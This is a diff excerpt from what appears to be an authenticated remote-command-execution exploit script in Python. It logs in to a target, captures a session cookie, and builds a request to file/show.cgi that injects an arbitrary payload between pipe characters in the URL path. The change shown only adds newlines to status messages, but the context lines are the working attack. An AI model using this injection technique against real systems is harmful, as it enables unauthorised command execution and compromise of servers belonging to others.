@@ -29,8 +29,8 @@ resp = requests.post(url, data=data, cookies={'testing': '1'}, verify=False, all
 
 try: sid = resp.cookies["sid"]
 except: sid = None
-if resp.status_code == 302 and sid: print('\nAuthentication successful!!!')
-else: exit('\nAuthentication Failed!!!')
+if resp.status_code == 302 and sid: print('\nAuthentication successful!!!\n')
+else: exit('\nAuthentication Failed!!!\n')
 
 alphanums = ''.join([random.choice(string.ascii_letters + string.digits) for i in range(5)])
 url = f'http://{target}/file/show.cgi/bin/{alphanums}|{payload}|'
